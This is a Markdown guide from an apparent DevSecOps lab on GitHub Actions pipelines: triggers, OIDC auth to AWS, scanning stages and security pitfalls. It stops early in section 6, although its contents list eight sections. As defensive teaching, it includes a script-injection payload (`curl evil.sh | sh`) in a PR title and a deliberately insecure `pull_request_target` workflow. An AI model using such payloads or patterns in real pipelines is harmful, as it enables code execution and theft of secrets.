# CI/CD & GitHub Actions - A Complete Technical Guide

> Part of the **`cicd-ecs-security-E2E`** lab: a Terraform-provisioned CI/CD + DevSecOps
> pipeline that builds a containerized app and deploys it to **AWS ECS Fargate** across
> **dev → qa → prod** using **GitHub Actions + OIDC**, with SAST (SonarQube), SCA/container
> scanning (Snyk), branch protection, and GitHub Environment approval gates.
>
> The live pipeline lives at [`repo-seed/.github/workflows/ci-cd.yml`](../repo-seed/.github/workflows/ci-cd.yml).
> Section 7 walks through it line-by-line as a worked example.

---

## Table of Contents

1. [Foundations: CI, CD, and how code gets to production](#1-foundations-ci-cd-and-how-code-gets-to-production)
2. [GitHub Actions anatomy (deep dive)](#2-github-actions-anatomy-deep-dive)
3. [How to design a GOOD pipeline](#3-how-to-design-a-good-pipeline)
4. [What to INCLUDE in a pipeline (with snippets)](#4-what-to-include-in-a-pipeline-with-snippets)
5. [What to LOOK OUT FOR (security & reliability pitfalls)](#5-what-to-look-out-for-security--reliability-pitfalls)
6. [DevSecOps: shift-left scanning & gating policy](#6-devsecops-shift-left-scanning--gating-policy)
7. [Worked example: walking through THIS repo's `ci-cd.yml`](#7-worked-example-walking-through-this-repos-ci-cdyml)
8. [Checklists: pipeline design & GitHub Actions security](#8-checklists)

---

## 1. Foundations: CI, CD, and how code gets to production

### 1.1 CI vs CD (delivery) vs Continuous Deployment

These three terms describe successive levels of automation. They are often conflated; the
distinctions matter because they determine **where a human stands in the loop**.

| Term | What it automates | Who decides to ship to prod? | Typical trigger |
| --- | --- | --- | --- |
| **Continuous Integration (CI)** | Merge → build → test → scan on every change. Catches integration problems early. | N/A - CI stops at "the artifact is good." | Every push / PR |
| **Continuous Delivery (CD)** | Everything in CI **plus** packaging and deploying to non-prod, with prod deploy **ready at the push of a button**. | A **human** approves the final prod release. | Merge to main + manual approval |
| **Continuous Deployment** | Same as delivery, but the prod deploy is **fully automatic** when all gates pass. | **Nobody** - the pipeline ships if green. | Merge to main |

```
                ┌──────────── Continuous Integration ────────────┐
  commit ─▶ build ─▶ unit/integration tests ─▶ static analysis ─▶ artifact
                └─────────────────────────────────────────────────┘
                                                       │
            ┌──────────── Continuous Delivery ─────────┴───────────┐
            ▼                                                       ▼
       deploy to dev/qa  ─▶  [ manual approval gate ]  ─▶  deploy to prod
                                       │
                          (remove this gate and you have
                            ▶ Continuous DEPLOYMENT)
```

> **This lab implements Continuous *Delivery*** for prod: prod deploys are gated behind a
> GitHub Environment with **required reviewers**, while dev can be configured for fully
> automatic (continuous *deployment*) behavior.

### 1.2 The build-once-deploy-many principle

**Build the artifact exactly once, then promote the *same bytes* through every
environment.** Never rebuild per environment.

- ✅ Build `app:v1.4.2` once → push to ECR → deploy that *same digest* to dev, then qa, then prod.
- ❌ Run `docker build` separately for dev, qa, and prod.

**Why it matters:** if you rebuild per environment, base images, transitive dependencies,
or build-time toolchains can drift between builds. The thing you tested in qa is then **not**
the thing that runs in prod. Build-once guarantees *what you scanned and tested is what ships*.

Environment-specific behavior should come from **configuration injected at deploy time**
(env vars, secrets, task-definition parameters), **not** from rebuilding.

> ⚠️ **Pitfall:** Tagging by a mutable tag like `latest` breaks build-once-deploy-many.
> Two deploys of "`latest`" can resolve to different image digests. Always promote an
> **immutable** identifier - a semver tag (`v1.4.2`) or, best, the **image digest**
> (`@sha256:…`). This lab tags prod with an auto-incremented `vX.Y.Z` and dev/qa with the
> 12-char commit SHA - both immutable.

### 1.3 Environment promotion: dev → qa → prod

Promotion is moving a *single, already-built* artifact through a series of increasingly
production-like environments, gaining confidence at each stage.

| Stage | Purpose | Gate | Audience |
| --- | --- | --- | --- |
| **dev** | Fast iteration, smoke confidence. Often auto-deploy. | None / minimal | Developers |
| **qa** (staging) | Integration, e2e, manual QA, perf, UAT. Prod-like. | Often a light approval | QA / stakeholders |
| **prod** | Real users. | **Required reviewer + (optionally) wait timer** | Customers |

In this repo the mapping is **branch-driven**:

| Git branch | Environment | Image tag scheme |
| --- | --- | --- |
| `dev` | `dev` | commit SHA (`abc123def456`) |
| `qa` | `qa` | commit SHA |
| `main` | `prod` | auto-bumped semver (`v0.0.1`, `v0.0.2`, …) |

### 1.4 Branching models: trunk-based vs GitFlow

| | **Trunk-based development** | **GitFlow** |
| --- | --- | --- |
| Long-lived branches | Just `main` (the "trunk") | `main`, `develop`, plus `release/*`, `hotfix/*` |
| Feature work | Short-lived branches merged ≤1-2 days | Feature branches off `develop`, can be long |
| Release | Tag on trunk; deploy continuously | Cut a `release/*` branch, stabilize, merge back |
| Best for | High-velocity teams, CD, microservices | Scheduled releases, multiple supported versions |
| Risk | Requires strong tests + feature flags | Merge hell, slow feedback, drift between branches |

**Recommendation:** prefer **trunk-based** for modern CD. Keep branches short-lived, hide
incomplete work behind **feature flags** rather than long branches, and gate merges with
required status checks.

> This lab uses a pragmatic **environment-branch hybrid**: `dev`/`qa`/`main` are long-lived
> *environment* branches, each wired to its own AWS environment. It is not pure trunk-based,
> but it keeps `main` PR-protected and uses `main` as the production trunk.

---

## 2. GitHub Actions anatomy (deep dive)

A GitHub Actions **workflow** is a YAML file in `.github/workflows/`. It is composed of:

```
workflow
└── triggers (on:)
└── permissions
└── jobs
    └── job
        └── runs-on (runner)
        └── needs (dependencies)
        └── environment (deployment target + gates)
        └── strategy.matrix
        └── steps
            └── uses: (an action)  OR  run: (a shell command)
```

### 2.1 Events / triggers (`on:`)

| Trigger | Fires when | Notes / risks |
| --- | --- | --- |
| `push` | Commits are pushed to matching branches/tags | The workhorse for CI + deploy-on-merge. |
| `pull_request` | A PR is opened/updated/reopened | Runs in the context of the **PR head**; **does not** get repo secrets when the PR is from a **fork** (good!). `GITHUB_TOKEN` is read-only for forks. |
| `pull_request_target` | Same as above, but runs in the context of the **base** repo | **Gets full secrets and a writable token.** ⚠️ Extremely dangerous if you `checkout` the PR head - see §5.1. |
| `workflow_dispatch` | A human (or API) manually starts it | Supports typed `inputs:`. Great for manual prod deploys / rollbacks. |
| `schedule` | Cron (`- cron: '0 6 * * *'`), UTC | Use for nightly scans, dependency audits. Skewed timing under load. |
| `workflow_call` | Another workflow calls it | Makes the workflow a **reusable workflow** (§2.12). |
| `workflow_run` | Another workflow completes | Runs *after* a named workflow; runs in the **base** context (secrets available) - handle untrusted artifacts carefully. |

```yaml
on:
  push:
    branches: [dev, qa, main]
  pull_request:
    branches: [main, dev, qa]
  workflow_dispatch:
    inputs:
      environment:
        description: "Target env"
        type: choice
        options: [dev, qa, prod]
```

> ⚠️ **Pitfall - `pull_request_target`:** People reach for it to "give PRs access to
> secrets" (e.g., to comment on the PR). The default `pull_request_target` checkout is the
> *base* branch - safe. But the moment you add `ref: ${{ github.event.pull_request.head.sha }}`
> you are running **attacker-controlled code with full secrets**. Avoid `pull_request_target`
> unless you fully understand it; never check out PR head code in it.

### 2.2 Jobs, steps, runners

- **Job:** a unit that runs on a single runner (a fresh VM/container). Jobs run **in
  parallel by default**; serialize them with `needs`.
- **Step:** an ordered task within a job. Either `uses:` (an action) or `run:` (a shell
  command). Steps share the runner's filesystem and (with limits) env.
- **Runner:** the machine executing the job.

| | **GitHub-hosted** | **Self-hosted** |
| --- | --- | --- |
| Setup | Zero - `runs-on: ubuntu-latest` | You install & maintain the runner agent |
| Isolation | Fresh ephemeral VM each run | You own isolation (re-use = risk) |
| Cost | Free minutes + per-minute after | Your hardware/cloud bill |
| Use when | Default for ~everything | Need GPUs, private network, big caches, specific OS |
| Risk | Low | **High** if used on public repos (see §5.9) |

### 2.3 Job lifecycle

```
queued ─▶ runner picked up ─▶ set up job (checkout token, env)
   ─▶ run pre-steps (action `pre:` hooks, e.g. cache restore)
   ─▶ run steps in order (stop on first failure unless if:/continue-on-error)
   ─▶ run post-steps (action `post:` hooks, e.g. cache save, cleanup)
   ─▶ report status, expose outputs
```

A failed step **fails the job** and skips remaining steps unless they declare
`if: always()` / `if: failure()` or the step had `continue-on-error: true`.

### 2.4 Contexts & expressions

Expressions use `${{ … }}`. The most important **contexts**:

| Context | Holds | Example |
| --- | --- | --- |
| `github` | Event metadata | `github.ref_name`, `github.event_name`, `github.sha`, `github.actor` |
| `env` | Env vars defined in the workflow | `env.SONAR_TOKEN` |
| `vars` | **Non-secret** config variables (repo/org/env) | `vars.AWS_REGION` |
| `secrets` | **Secret** values (masked in logs) | `secrets.SNYK_TOKEN` |
| `needs` | Outputs of upstream jobs | `needs.build-and-scan.outputs.image` |
| `matrix` | Current matrix combination | `matrix.node` |
| `steps` | Outputs of earlier steps | `steps.version.outputs.version` |
| `runner` | Runner info | `runner.os`, `runner.temp` |
| `job` | Current job status/services | `job.status` |

Useful operators/functions: `==`, `!=`, `&&`, `||`, `!`, `contains()`, `startsWith()`,
`endsWith()`, `format()`, `fromJSON()`, `toJSON()`, `hashFiles()`, and the status functions
`success()`, `failure()`, `always()`, `cancelled()`.

```yaml
# Ternary-ish idiom (no real ternary exists):
environment: ${{ github.ref_name == 'main' && 'prod' || github.ref_name }}
```

### 2.5 Env vars and where `if:` can/can't see them

This trips up nearly everyone:

```yaml
env:
  DEPLOY: "true"
jobs:
  build:
    if: env.DEPLOY == 'true'   # ❌ job-level if: CANNOT read workflow `env`
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
        if: env.DEPLOY == 'true' # ✅ step-level if: CAN read env
```

| Scope | Can a **job-level** `if:` read it? | Can a **step-level** `if:` read it? |
| --- | --- | --- |
| `env:` (workflow/job/step) | ❌ No | ✅ Yes |
| `vars.*`, `secrets.*`, `github.*`, `needs.*` | ✅ Yes | ✅ Yes |

> ⚠️ **Pitfall:** For **job-level** conditions, use `vars`, `needs`, or `github.*` - not
> `env`. This lab correctly uses `if: github.event_name == 'push'` at step level and
> `if: github.event_name == 'push'` at the `deploy` job level (a `github.*` value, which
> job-level `if:` *can* read).

Also note: the `secrets` context **cannot** be used in any `if:` condition, job-level or
step-level. To branch on whether a secret is configured, surface it into `env` first
(the lab does `env: SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}` then `if: env.SONAR_TOKEN != ''`).
This is the supported pattern and it also keeps the secret value out of the expression log.

### 2.6 Job outputs & the `needs` graph

A job exposes outputs that downstream jobs consume via `needs`:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.push.outputs.image }}   # job output <= step output
    steps:
      - id: push
        run: echo "image=registry/app:v1" >> "$GITHUB_OUTPUT"
  deploy:
    needs: build                                 # waits for build, gains its outputs
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.image }}"
```

`needs` builds a **DAG**. A job with `needs: [a, b]` runs only after both succeed (unless it
uses `if: always()`). Step outputs are written to the `$GITHUB_OUTPUT` file (the older
`::set-output` syntax is **deprecated/removed**).

### 2.7 Matrix builds

Run the same job across combinations (OS × language version × …):

```yaml
strategy:
  fail-fast: false          # don't cancel siblings when one fails
  max-parallel: 4
  matrix:
    node: [18, 20, 22]
    os: [ubuntu-latest, windows-latest]
    include:
      - node: 20
        os: ubuntu-latest
        coverage: true       # add a property to one combo
    exclude:
      - node: 18
        os: windows-latest
runs-on: ${{ matrix.os }}
```

### 2.8 Concurrency groups & `cancel-in-progress`

Prevent overlapping runs from racing (e.g., two deploys to prod at once):

```yaml
concurrency:
  group: deploy-${{ github.ref }}     # one in-flight run per branch
  cancel-in-progress: true            # newer push cancels the older run
```

> ⚠️ **Pitfall:** `cancel-in-progress: true` is great for CI on PRs (cancel stale builds)
> but **dangerous for deploy jobs** - cancelling mid-deploy can leave a half-rolled service.
> For deploys, prefer `cancel-in-progress: false` (queue, don't cancel).

### 2.9 Caching (`actions/cache`)

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-${{ runner.os }}-
```

The cache key should be derived from a **lockfile hash** so it invalidates on dependency
changes. See §5.5 for cache-poisoning risks.

### 2.10 Artifacts (upload/download)

Artifacts pass *files* between jobs or persist build output:

```yaml
- uses: actions/upload-artifact@v4
  with: { name: dist, path: ./dist, retention-days: 7 }
# ... in a later job:
- uses: actions/download-artifact@v4
  with: { name: dist, path: ./dist }
```

> **Caches vs artifacts:** caches *speed up* a job (best-effort, may be evicted); artifacts
> *transfer/retain deliverables* (guaranteed for the retention window). Don't store build
> outputs you must promote in a cache.

### 2.11 Reusable workflows vs composite actions

| | **Reusable workflow** | **Composite action** |
| --- | --- | --- |
| Defined as | A whole workflow with `on: workflow_call` | An `action.yml` with `runs: using: composite` |
| Reuses | **Entire jobs** (own runners, secrets, environments) | A **sequence of steps** inside one job |
| Called via | `uses: org/repo/.github/workflows/x.yml@ref` | `uses: org/repo/.github/actions/x@ref` (inside steps) |
| Use when | Standardize a whole pipeline shape | Bundle repeated steps (setup, login, scan) |

```yaml
# Calling a reusable workflow:
jobs:
  call:
    uses: my-org/ci/.github/workflows/build.yml@v1
    with: { image_name: app }
    secrets: inherit
```

### 2.12 Marketplace actions & pinning

`uses:` can reference: a path in your repo, another repo (`owner/repo@ref`), or a Docker
image. **How you pin `@ref` is a security decision** (see §5.4):

```yaml
- uses: actions/checkout@v4                                   # tag - convenient, mutable
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # full SHA - immutable ✅
```

### 2.13 Permissions & `GITHUB_TOKEN` least privilege

Every run gets an automatic `GITHUB_TOKEN`. Scope it down:

```yaml
permissions:
  contents: read        # default to read-only everything…
# …then widen ONLY where needed, at the job level:
jobs:
  release:
    permissions:
      contents: write   # only this job can push tags/commits
      id-token: write   # only where OIDC is needed
```

> **Best practice:** set `permissions: {}` or `contents: read` at the **workflow** top, and
> grant extra scopes **per job**. The lab does exactly this: top-level `contents: read` +
> `id-token: write`, then the `build-and-scan` job adds `contents: write` (to push the git
> tag) and the `deploy` job keeps `contents: read`.

### 2.14 Environments, required reviewers, wait timers

A **GitHub Environment** is a named deployment target (`dev`, `qa`, `prod`) with protection
rules. A job that declares `environment: prod` will **pause** until the rules are satisfied:

- **Required reviewers** - named users/teams must click *Approve* before the job runs.
- **Wait timer** - a forced delay (e.g., 10 min "cool-off" before prod).
- **Deployment branch policy** - restrict which branches may deploy to this environment.
- **Environment secrets/vars** - resolve **only after** approval, so secrets can't be read
  by an un-approved run.

This is the **approval gate**. In this lab, environments + reviewers + wait timers are
provisioned in Terraform (`github_repository_environment`).

### 2.15 OIDC for cloud auth (no long-lived keys)

Instead of storing static AWS access keys as secrets, the runner requests a **short-lived
OIDC token** from GitHub and exchanges it for temporary AWS credentials via
`sts:AssumeRoleWithWebIdentity`. The AWS role's **trust policy** restricts *which repo /
branch / environment* may assume it.

```yaml
permissions:
  id-token: write          # REQUIRED to mint the OIDC token
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789012:role/my-deploy-role
    aws-region: us-east-1
```

The OIDC token's `sub` claim looks like
`repo:OWNER/REPO:environment:prod` or `repo:OWNER/REPO:ref:refs/heads/main`. The AWS trust
policy in this lab (`iam.tf`) keys on exactly those, so **dev can never assume the prod
role**. This is the single biggest security win over PATs/static keys.

---

## 3. How to design a GOOD pipeline

### 3.1 Principles

1. **Fast feedback / fail fast.** Put the cheapest, most-likely-to-fail checks first
   (lint, format, unit tests) so developers learn within seconds, not after a 20-minute build.
2. **Deterministic & idempotent.** Same input → same output. Pin tool versions, pin actions,
   use lockfiles. Re-running a stage must be safe.
3. **Immutable, versioned artifacts.** Build once, tag immutably, promote the same artifact.
4. **Parallelize independent work.** Lint, unit tests, and SAST don't depend on each other.
5. **Cheap before expensive.** Don't spin up a full e2e/integration suite or push to a
   registry before the unit tests and linters pass.
6. **Gates & approvals at the right boundaries.** Automated gates on quality/security;
   human gates before prod.
7. **Observability.** Surface results (status checks, SARIF in the Security tab, summaries,
   notifications). A pipeline you can't read is a pipeline you can't trust.
8. **Rollback strategy.** Always have a one-step way back (redeploy previous immutable tag,
   ECS rolling back to the prior task-definition revision).
9. **Promotion via reviewed change, not rebuild.** Moving an artifact from qa to prod should
   be a reviewable, audited event (a PR, a tag, or a Git commit to a config/manifest repo),
   not a fresh build. The change shows exactly which digest is moving and who approved it.
10. **Separation of duties.** The identity that writes code should not be the identity that
    self-approves its own production release. Enforce this with branch protection
    (required reviewers, no self-approval where supported), GitHub Environment required
    reviewers on prod, and per-environment OIDC roles so a dev-branch run cannot assume the
    prod role.
11. **Supply-chain integrity is part of the artifact.** Generate an SBOM, sign the image
    (cosign, keyless via OIDC), and produce SLSA build provenance. Downstream, *verify* the
    signature and provenance before deploy so only artifacts your pipeline built can ship.

### 3.2 Recommended stage order (and why)

```mermaid
flowchart TD
  A[Checkout] --> B[Lint / Format]
  B --> C[Unit tests]
  C --> D[Secret scan + SAST + SCA + IaC scan]
  D --> E[Build image]
  E --> F[Container image scan]
  F --> G[SBOM + Sign image]
  G --> H[Integration / E2E tests]
  H --> I{Push event?}
  I -- no PR --> Z[Stop: report status only]
  I -- yes --> J[Push image to registry]
  J --> K[[Approval gate: prod]]
  K --> L[Deploy to ECS]
  L --> M[Smoke test]
  M --> N{Healthy?}
  N -- yes --> O[Notify success]
  N -- no --> P[Rollback + notify]
```

**Why this order:**

- **Lint/unit first** - seconds of compute reject the most common mistakes before you spend
  minutes building.
- **Static scans before build** - secret/SAST/IaC scans need only source; running them early
  fails fast and keeps secrets out of any built artifact.
- **Build before image scan** - you can only scan layers you've built.
- **SBOM right after build, sign after push** - generate the SBOM for the exact artifact, and
  sign by **digest** once the image is in the registry (cosign signs the registry digest, and
  the signature is stored alongside it). Capture SLSA provenance for that same digest.
- **Integration/e2e after build** - they're slow and need the runnable artifact; gate them
  behind the cheap checks.
- **Push & deploy last, gated** - only validated artifacts reach a registry; only approved
  artifacts reach prod.
- **Smoke test + rollback** - verify reality, and have an automatic exit if it's wrong.

### 3.3 How the deploy actually happens: push-CD vs GitOps

The CI half (build, test, scan, sign, push image) is the same everywhere. The CD half splits
along how the target platform is updated:

| Target | Enterprise norm | What CI does | What performs the deploy |
| --- | --- | --- | --- |
| **AWS ECS / Lambda / serverless** | Push-style CD from CI to a cloud API, authenticated by OIDC | Renders the new task definition with the immutable image and calls the deploy API | A short-lived, env-scoped IAM role assumed via OIDC (no static keys) |
| **Kubernetes** | **GitOps** (Argo CD or Flux) | Bumps the image digest in a Git-tracked manifest/Helm/Kustomize repo (via PR) | An in-cluster controller that **pulls** the desired state from Git and reconciles |

> **Kubernetes: use GitOps, not `kubectl` from CI.** Running `kubectl apply` (or `helm
> upgrade`) directly from a CI runner is a known anti-pattern in mature orgs. It requires
> handing long-lived cluster-admin credentials to CI, gives no single source of truth for
> what is actually deployed, and makes drift and rollback ad hoc. The enterprise pattern is
> **pull-based GitOps**: CI's only job at the end is to open a PR that updates the desired
> image digest in a config repo. A controller running **inside** the cluster (Argo CD or
> Flux) watches that repo and reconciles the live state to match. Benefits: the Git history
> is the audit log and the approval gate, rollback is `git revert`, drift is detected and
> corrected automatically, and the cluster never exposes credentials to CI. This lab targets
> ECS, so it legitimately uses the push-CD column (env-scoped OIDC role calling the ECS API);
> if it were Kubernetes, the deploy step would be replaced by a manifest-bump PR consumed by
> Argo CD or Flux.

### 3.4 Policy-as-code gates

Mature pipelines do not rely on a reviewer remembering a rule. Encode the rules as code and
fail the build automatically:

- **Admission / deploy gates:** OPA/Gatekeeper or Kyverno (Kubernetes), or Conftest (OPA) run
  in CI against rendered manifests / Terraform plans, to block non-compliant config.
- **Severity thresholds** for SAST/SCA/container scans live in the workflow (version-controlled),
  not in per-reviewer judgment (see §6).
- **Provenance/signature verification at deploy time:** require a valid cosign signature and
  SLSA provenance for the exact digest before it is allowed to run (e.g., Kyverno image
  verification, or cosign `verify` in the deploy job).

---

## 4. What to INCLUDE in a pipeline (with snippets)

> **Blocking policy:** Things that mean "the code/artifact is *wrong*" should **block**
> (fail the build). Things that are *informational or noisy* should **warn** (report but
> continue), usually via `continue-on-error: true` plus uploading results.

| Stage | Tool examples | Block or Warn? | Why |
| --- | --- | --- | --- |
| Lint / format | eslint, prettier, gofmt, ruff | **Block** | Cheap, deterministic, style/contract |
| Unit tests | jest, pytest, go test | **Block** | Correctness |
| Integration / e2e | playwright, testcontainers | **Block** (de-flake first) | Correctness across components |
| Build | docker build | **Block** | Can't ship what won't build |
| SAST | SonarQube, CodeQL, Semgrep | **Block on high/critical** | First-party code vulns |
| SCA / deps | Snyk, `npm audit`, Dependabot | **Block critical**, warn lower | Known CVEs in deps |
| Secret scan | gitleaks, trufflehog | **Block** | A leaked secret is an incident |
| Container scan | Trivy, Snyk, Grype | **Block fixable critical**, warn else | Vulns in image layers |
| IaC scan | Trivy config, checkov (tfsec is deprecated into Trivy) | **Block on policy violations** | Misconfigured cloud |
| SBOM | syft | Warn (artifact) | Provenance, audit |
| Publish | docker push / ECR | **Block** | The promotion step |
| Sign + provenance | cosign, attest-build-provenance | **Block** if signing fails | Sign/attest the pushed digest (supply-chain integrity) |
| Deploy | ECS deploy action (push-CD) or GitOps manifest-bump (K8s) | **Block** | The release |
| Smoke test | curl health endpoint | **Block → rollback** | Catch bad releases |
| Notify | Slack, email | Never blocks | Observability |

### 4.1 Lint / format

```yaml
- run: npm ci
- run: npm run lint
- run: npx prettier --check .
```

### 4.2 Unit tests (with coverage)

```yaml
- run: npm test -- --coverage
- uses: actions/upload-artifact@v4
  with: { name: coverage, path: coverage/ }
```

### 4.3 Integration / e2e with service containers

```yaml
jobs:
  integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: test }
        ports: ['5432:5432']
        options: >-
          --health-cmd pg_isready --health-interval 10s
          --health-timeout 5s --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run test:integration
        env: { DATABASE_URL: postgres://postgres:test@localhost:5432/postgres }
```

### 4.4 Build

```yaml
- name: Build image (validation)
  run: docker build -t app:ci .
```

### 4.5 SAST (SonarQube - as used in this lab)

```yaml
- name: SonarQube scan
  if: env.SONAR_TOKEN != ''
  uses: sonarsource/sonarqube-scan-action@v4
```

CodeQL alternative (emits SARIF to the Security tab):

```yaml
- uses: github/codeql-action/init@v3
  with: { languages: javascript }
- uses: github/codeql-action/analyze@v3
```

### 4.6 SCA / dependency scan

```yaml
# In production pin this to a full commit SHA, not @master (see §5.4).
- uses: snyk/actions/node@<full-commit-sha>  # e.g. snyk/actions/node@<40-char-sha>
  env: { SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }} }
  with: { args: --severity-threshold=high }
```

### 4.7 Secret scanning

```yaml
- uses: gitleaks/gitleaks-action@v2
  env: { GITLEAKS_LICENSE: ${{ secrets.GITLEAKS_LICENSE }} }   # org only; OSS free
# or trufflehog (pin to a full commit SHA in production, not @main - see §5.4):
- uses: trufflesecurity/trufflehog@<full-commit-sha>
  with: { extra_args: --only-verified }
```

### 4.8 Container image scan (Trivy)

```yaml
- uses: aquasecurity/trivy-action@0.28.0
  with:
    image-ref: app:ci
    format: sarif
    output: trivy.sarif
    severity: CRITICAL,HIGH
    exit-code: '1'        # block on findings
- uses: github/codeql-action/upload-sarif@v3
  if: always()
  with: { sarif_file: trivy.sarif }
```

### 4.9 IaC scan (Trivy / checkov)

```yaml
# Trivy config scan covers Terraform, Dockerfile, and Kubernetes manifests.
# (tfsec is deprecated: Aqua merged its checks into Trivy, so use Trivy's config mode.)
- uses: aquasecurity/trivy-action@<full-commit-sha>
  with:
    scan-type: config
    scan-ref: .
    severity: CRITICAL,HIGH
    exit-code: '1'
# or checkov:
- uses: bridgecrewio/checkov-action@<full-commit-sha>
  with: { directory: ., framework: terraform }
```

### 4.10 SBOM (syft) + image signing (cosign)

Signing targets the **pushed digest** (see §4.11), so in a real pipeline the `cosign sign`
step runs after the publish step, against `$REGISTRY/$REPO@<digest>`.

```yaml
# id-token: write is required for cosign keyless signing (and for SLSA provenance).
- uses: anchore/sbom-action@v0
  with: { image: app:ci, output-file: sbom.spdx.json }
- uses: sigstore/cosign-installer@v3
# Sign the image by DIGEST, never a mutable tag. Keyless is the default in cosign v2+
# (no COSIGN_EXPERIMENTAL needed); the ephemeral key is bound to the workflow's OIDC identity.
- run: cosign sign --yes "$REGISTRY/$REPO@$IMAGE_DIGEST"
```

For SLSA build provenance, generate an in-toto attestation for the same digest. On
GitHub-hosted runners the built-in `actions/attest-build-provenance` action produces a
signed provenance attestation; the deploy/admission side can then require it.

### 4.11 Publish, deploy, smoke test, rollback

```yaml
# publish
- run: docker push "$REGISTRY/$REPO:$TAG"
# deploy (ECS) - see §7
# smoke test
- run: |
    for i in $(seq 1 10); do
      curl -fsS "https://app.example.com/health" && exit 0
      sleep 6
    done
    exit 1
# rollback (redeploy the previous immutable task-def revision)
- if: failure()
  run: aws ecs update-service --cluster "$C" --service "$S" --task-definition "$PREV_REVISION"
```

---

## 5. What to LOOK OUT FOR (security & reliability pitfalls)

### 5.1 `pull_request_target` + checkout of untrusted code

> ⚠️ **The classic critical bug.** `pull_request_target` runs with **full secrets and a
> write token in the base-repo context**. If you then check out the PR's head (attacker
> code) and run its build/test scripts, you have handed your secrets and write access to
> anyone who opens a PR.

```yaml
# ❌ NEVER do this
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} } # attacker code
      - run: npm ci && npm test     # runs attacker scripts WITH secrets
```

**Fix:** use plain `pull_request` for anything that runs PR code; reserve
`pull_request_target` for narrow tasks that *don't* execute PR code, and never check out the
head there. This lab uses plain `pull_request` and grants **no AWS access** on PRs.

### 5.2 Script injection via `${{ github.event.* }}` in `run:`

Untrusted fields (PR title, branch name, commit message, issue body) are interpolated
**before** the shell runs - an attacker controls the script text:

```yaml
# ❌ injection: a PR titled `"; curl evil.sh | sh; #` executes on your runner
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

**Fix:** pass untrusted data through an **environment variable**, then reference the env var
(the shell, not the expression engine, handles it safely):

```yaml
- env: { TITLE: ${{ github.event.pull_request.title }} }
  run: echo "Title: $TITLE"     # ✅ safe
```

### 5.3 Over-scoped PAT vs OIDC

| | **Long-lived PAT / static cloud keys** | **OIDC short-lived tokens** |
| --- | --- | --- |
| Lifetime | Months/years until rotated | Minutes |
| Blast radius if leaked | Huge | Tiny (expires fast, scoped by trust policy) |
| Scoping | Coarse | Per repo / branch / environment via `sub` claim |
| Rotation | Manual, error-prone | None needed |

**Use OIDC.** This lab has **no** static AWS keys; each environment has its own role with a
trust policy restricting the `sub` to that env/branch (`iam.tf`).

### 5.4 Unpinned third-party actions

> ⚠️ A tag like `@v4` or `@master` is **mutable**. If the action's maintainer (or an
> attacker who compromises them) re-points the tag, your pipeline silently runs new code -
> **with your secrets**.

```yaml
- uses: some/action@v3                                          # ❌ mutable
- uses: some/action@e3b0c44298fc1c149afbf4c8996fb924...        # ✅ pin to full commit SHA
```

**Policy:** pin **all third-party** actions to a full 40-char commit SHA (a comment with the
version helps). First-party `actions/*` and verified publishers are lower risk but pinning is
still best practice. Enable Dependabot for actions to get SHA-bump PRs.

> Note: the lab's `ci-cd.yml` uses tag pins (`@v4`, and `snyk/actions/docker@master`) for
> readability as a teaching example. **In production, pin these to SHAs** -
> `@master` in particular is the weakest possible pin.

### 5.5 Cache poisoning

A malicious PR can write to a cache key that a later trusted run (e.g., on `main`) restores,
injecting attacker files into your build.

**Mitigations:** scope cache keys by ref where it matters; don't cache anything executable or
build-affecting from untrusted PRs; treat restored caches as untrusted input; prefer
lockfile-hash keys so unexpected content invalidates.

### 5.6 Leaking secrets in logs

- GitHub auto-masks registered secrets, but **derived** values (base64, substrings, secrets
  echoed by a tool) may slip through.
- Never `echo` secrets. Avoid `set -x` in steps that touch secrets.
- Beware passing secrets as command-line args (visible in process lists / verbose logs);
  prefer env vars or files.
- Forked PRs do **not** receive secrets (by design) - don't try to work around this.

### 5.7 Flaky / slow tests

Flaky tests erode trust until people merge red builds. **Quarantine** flaky tests, fix the
root cause (timing, shared state, network), and keep the critical path fast. Use `timeout-minutes`
on jobs so a hung test can't burn an hour.

```yaml
jobs:
  test:
    timeout-minutes: 15
```

### 5.8 Missing concurrency control

Without `concurrency`, two merges can deploy simultaneously and race. Add a group per
environment (§2.8). For deploys, **queue** rather than cancel.

### 5.9 Giving forks secrets / self-hosted runners on public repos

> ⚠️ Default **self-hosted** runners on a **public** repo are a known critical risk: anyone
> can open a PR whose workflow runs **arbitrary code on your runner**. Because self-hosted
> runners are **not ephemeral by default**, malware can persist and steal later runs' secrets.

**Hardening:**
- Prefer **GitHub-hosted** runners for public repos.
- If you must self-host: use **ephemeral**, single-job runners; run in isolated/disposable
  VMs/containers; restrict to private repos or require approval for PR workflows from
  outside collaborators (the "Require approval for all outside collaborators" / fork-PR
  settings); never store long-lived credentials on the runner; network-segregate it.
- Restrict which actions can run (allow-list `actions/*` and trusted publishers).

### Hardening checklist (quick)

- [ ] `permissions:` minimized at workflow top; widened per-job only as needed
- [ ] No `pull_request_target` checking out PR head code
- [ ] No untrusted `${{ github.event.* }}` interpolated directly in `run:`
- [ ] All third-party actions pinned to full commit SHA
- [ ] Cloud auth via OIDC, no static keys; trust policy scoped to repo/branch/env
- [ ] Forked PRs get no secrets and no cloud access
- [ ] Concurrency control on deploy (queue, don't cancel)
- [ ] Secrets never echoed; passed via env, not CLI args
- [ ] Self-hosted runners ephemeral & isolated (or avoided on public repos)
- [ ] `timeout-minutes` on long jobs
- [ ] Required reviewers + branch protection on prod

---

## 6. DevSecOps: shift-left scanning & gating policy

**Shift-left** = run security checks as early (and as often) as possible - in the IDE, in
pre-commit hooks, and in CI on every PR - instead of a single audit before release. The
earlier a flaw is caught, the cheaper it is to fix.

